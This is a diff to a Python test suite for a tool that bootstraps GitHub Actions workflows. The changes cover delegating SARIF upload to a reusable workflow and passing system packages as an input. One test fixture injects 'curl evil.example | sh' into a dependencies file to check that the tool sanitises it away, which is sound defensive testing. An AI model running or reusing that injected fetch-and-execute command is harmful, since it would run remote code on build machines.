@@ -131,6 +131,10 @@ def test_parse_bootstrap_args_defaults() -> None:
         # canonical and C002 stays silent.
         "unit_coverage_fail_under": "",
         "use_ghcr_base": "",
+        # No flag of its own: autodetected from an existing
+        # vulnerability-scan.yml so an app that vendors LFS-tracked assets into
+        # its Docker build context keeps `lfs: true` across a bootstrap run.
+        "vuln_scan_lfs": "",
         "enforce": "",
         "conformance_blocking": "",
         "renovate_automerge": "",
@@ -800,10 +804,20 @@ def test_conformance_upload_sarif_workflow_run_trigger() -> None:
     assert "branches: [main]" in content
 
 
-def test_conformance_upload_sarif_decoupled_from_gate() -> None:
-    """Upload workflow uses continue-on-error on download so it always exits 0."""
+def test_conformance_upload_sarif_delegates_to_the_reusable() -> None:
+    """The body — probe, download, strip, upload — lives in application-sdk.
+
+    Its behaviour (the eligibility gate, the artifact glob, `continue-on-error`
+    so the workflow always exits 0) is asserted against the reusable itself in
+    `test_upload_sarif_probe_wiring.py`. What the template owes is that it
+    calls that file, since a caller pointing somewhere else runs a body
+    nothing tests.
+    """
     content = render("conformance-upload-sarif.yaml")
-    assert "continue-on-error: true" in content
+    assert (
+        "atlanhq/application-sdk/.github/workflows/"
+        "conformance-upload-sarif-reusable.yaml@main" in content
+    )
 
 
 def test_conformance_upload_sarif_passes_ref_and_sha() -> None:
@@ -820,17 +834,29 @@ def test_conformance_upload_sarif_has_required_permissions() -> None:
     assert "actions: read" in content
 
 
-def test_conformance_upload_sarif_covers_all_series() -> None:
-    """Upload workflow covers all four conformance series slugs."""
+def test_conformance_upload_sarif_takes_the_default_series_list() -> None:
+    """A consumer app uploads the four series its conformance run produces.
+
+    The list is the reusable's default rather than a per-repo value, so the
+    template must NOT pass `slugs:` — a caller that pins its own copy stops
+    tracking the set, and a series added to the suite would silently never
+    reach that repo's Security tab. The default's contents are asserted
+    against the reusable in `test_upload_sarif_probe_wiring.py`.
+    """
     content = render("conformance-upload-sarif.yaml")
-    for slug in ("ci", "error-handling", "prescriptions", "optimizations"):
-        assert slug in content, f"Missing series slug: {slug}"
+    assert "slugs:" not in content, (
+        "the template pins its own series list; it must inherit the "
+        "reusable's default so a new series reaches every repo"
+    )
 
 
 def test_all_shims_have_atlanhq_uses_reference() -> None:
     """Every managed workflow delegates to atlanhq/* (or a known inline file)."""
     # These files contain inline logic (no `uses: atlanhq/...`) but are still standard.
-    inline_ok = {"release-gate.yaml", "conformance-upload-sarif.yaml"}
+    # `conformance-upload-sarif.yaml` left this set in FND-1994: it is now a
+    # thin caller like the rest, so it must carry an `atlanhq/` reference and
+    # is no longer exempt.
+    inline_ok = {"release-gate.yaml"}
     for name in MANAGED_WORKFLOWS:
         content = render(name)
         if name in inline_ok:
@@ -2031,22 +2057,26 @@ def test_parse_bootstrap_args_system_deps_rejects_shell_metacharacters(
     assert "invalid package name" in capsys.readouterr().err
 
 
-def test_checks_yml_without_deps_is_byte_identical_to_no_step_render() -> None:
+def test_checks_yml_without_deps_declares_no_inputs() -> None:
     """The <% if %> tags hug their content so an un-taken block leaves no stray
     blank line -- a one-line whitespace difference here would surface as C002
     drift in every already-bootstrapped repo (none of which passes this flag)."""
     rendered = render("checks.yml")
-    assert "apt-get" not in rendered
-    # The checkout step is followed immediately by setup-deps, with nothing
-    # (not even an empty line) where the conditional block sat.
-    assert "# v7.0.1\n      - uses: atlanhq" in rendered
+    assert "system_deps" not in rendered
+    # The concurrency block is the last thing in the job, with nothing (not even
+    # an empty line) where the conditional `with:` sat.
+    assert rendered.endswith(
+        "cancel-in-progress: ${{ startsWith(github.ref, 'refs/pull/') }}\n"
+    )
 
 
-def test_checks_yml_renders_system_deps_step() -> None:
+def test_checks_yml_renders_system_deps_input() -> None:
+    """The packages reach the reusable as an input, quoted so a multi-package
+    value survives `extract_field`'s read-back whole."""
     rendered = render("checks.yml", system_deps=_KRB5_DEPS)
-    assert f"sudo apt-get install -y {_KRB5_DEPS}" in rendered
-    # Ordered before setup-deps: the packages exist to make its `uv sync` work.
-    assert rendered.index("apt-get install") < rendered.index("setup-deps@main")
+    assert f'system_deps: "{_KRB5_DEPS}"' in rendered
+    # Declared on the call, not somewhere the reusable will never see it.
+    assert rendered.index("checks-reusable.yaml@main") < rendered.index("system_deps")
 
 
 def test_cmd_bootstrap_writes_system_deps_step(
@@ -2054,7 +2084,7 @@ def test_cmd_bootstrap_writes_system_deps_step(
 ) -> None:
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
-    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
+    assert f'system_deps: "{_KRB5_DEPS}"' in _checks_yml(tmp_path)
 
 
 def test_cmd_bootstrap_omits_system_deps_step_by_default(
@@ -2062,7 +2092,7 @@ def test_cmd_bootstrap_omits_system_deps_step_by_default(
 ) -> None:
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
-    assert "apt-get" not in _checks_yml(tmp_path)
+    assert "system_deps" not in _checks_yml(tmp_path)
 
 
 def test_cmd_bootstrap_rerun_preserves_system_deps_step(
@@ -2097,7 +2127,7 @@ def test_cmd_bootstrap_detects_hand_written_system_deps_step(
     )
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
-    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
+    assert f'system_deps: "{_KRB5_DEPS}"' in _checks_yml(tmp_path)
 
 
 def test_cmd_bootstrap_explicit_system_deps_overrides_autodetect(
@@ -2107,7 +2137,7 @@ def test_cmd_bootstrap_explicit_system_deps_overrides_autodetect(
     _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
     _cmd_bootstrap(["--system-deps", "libpq-dev"])
     checks = _checks_yml(tmp_path)
-    assert "sudo apt-get install -y libpq-dev" in checks
+    assert 'system_deps: "libpq-dev"' in checks
     assert "libkrb5-dev" not in checks
 
 
@@ -2142,7 +2172,7 @@ def test_cmd_bootstrap_detects_system_deps_from_ci_deps_file(
     deps_file.write_text("libkrb5-dev gcc\n")
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
-    assert "sudo apt-get install -y libkrb5-dev gcc" in _checks_yml(tmp_path)
+    assert 'system_deps: "libkrb5-dev gcc"' in _checks_yml(tmp_path)
 
 
 def test_cmd_bootstrap_ci_deps_file_ignores_junk_tokens(
@@ -2154,10 +2184,10 @@ def test_cmd_bootstrap_ci_deps_file_ignores_junk_tokens(
     deps_file.write_text("libkrb5-dev && curl evil.example | sh\n")
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
-    install_line = next(
-        line for line in _checks_yml(tmp_path).splitlines() if "apt-get install" in line
+    declaration = next(
+        line for line in _checks_yml(tmp_path).splitlines() if "system_deps:" in line
     )
-    assert install_line.strip() == "sudo apt-get install -y libkrb5-dev"
+    assert declaration.strip() == 'system_deps: "libkrb5-dev"'
 
 
 def test_conformance_detect_action_installs_declared_system_deps() -> None:
@@ -2180,7 +2210,7 @@ def test_cmd_bootstrap_rerun_after_manual_step_removal_leaves_it_out(
     (tmp_path / ".github" / "workflows" / "checks.yml").write_text(render("checks.yml"))
     (tmp_path / ".github" / "ci-system-deps.txt").unlink()
     _cmd_bootstrap([])
-    assert "apt-get" not in _checks_yml(tmp_path)
+    assert "system_deps" not in _checks_yml(tmp_path)
     assert not (tmp_path / ".github" / "ci-system-deps.txt").exists()
 
 
@@ -2193,7 +2223,7 @@ def test_cmd_bootstrap_restores_step_from_ci_deps_file_when_checks_stripped(
     _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
     (tmp_path / ".github" / "workflows" / "checks.yml").write_text(render("checks.yml"))
     _cmd_bootstrap([])
-    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
+    assert f'system_deps: "{_KRB5_DEPS}"' in _checks_yml(tmp_path)
 
 
 # ---------------------------------------------------------------------------
